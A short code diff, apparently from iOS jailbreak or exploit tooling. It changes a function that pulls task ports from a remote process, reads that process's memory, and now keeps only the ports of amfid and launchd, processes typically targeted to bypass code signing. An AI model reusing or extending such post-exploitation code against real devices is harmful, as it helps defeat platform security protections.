@@ -96,10 +96,11 @@ get_task_ports(mach_port_t task_port)
     mach_port_t local_name = pull_remote_port(task_port, remote_name, MACH_MSG_TYPE_COPY_SEND);
     actual_task_port_names[i] = local_name;
       
+      
     pid_t task_pid = 0;
     err = pid_for_task(local_name, &task_pid);
     if (err != KERN_SUCCESS){
-      printf("pid_for_task failed on pulled task port %x\n", local_name);
+      printf("[ERROR]: pid_for_task failed on pulled task port %x\n", local_name);
       continue;
     }
       
@@ -108,18 +109,21 @@ get_task_ports(mach_port_t task_port)
     if (err == 0) {
       continue;
     }
+      
     
     // copy the remote buffer back here:
     remote_read_overwrite(task_port, remote_path_buffer, (uint64_t)local_path_buffer, remote_path_buffer_size);
     
-    printf("[INFO] %s - pid: %d\n", local_path_buffer, task_pid);
-      
-    struct task_port_list_entry* port_list_entry = malloc(sizeof(struct task_port_list_entry));
-    port_list_entry->next = port_list_head;
-    port_list_entry->port = local_name;
-    port_list_entry->pid = task_pid;
-    port_list_entry->path = strdup(local_path_buffer);
-    port_list_head = port_list_entry;
+    // Only add the ports we need
+    if(strstr(local_path_buffer, "amfid") || strstr(local_path_buffer, "launchd")) {
+     
+        struct task_port_list_entry* port_list_entry = malloc(sizeof(struct task_port_list_entry));
+        port_list_entry->next = port_list_head;
+        port_list_entry->port = local_name;
+        port_list_entry->pid = task_pid;
+        port_list_entry->path = strdup(local_path_buffer);
+        port_list_head = port_list_entry;
+    }
   }
   
   free(actual_task_port_names);
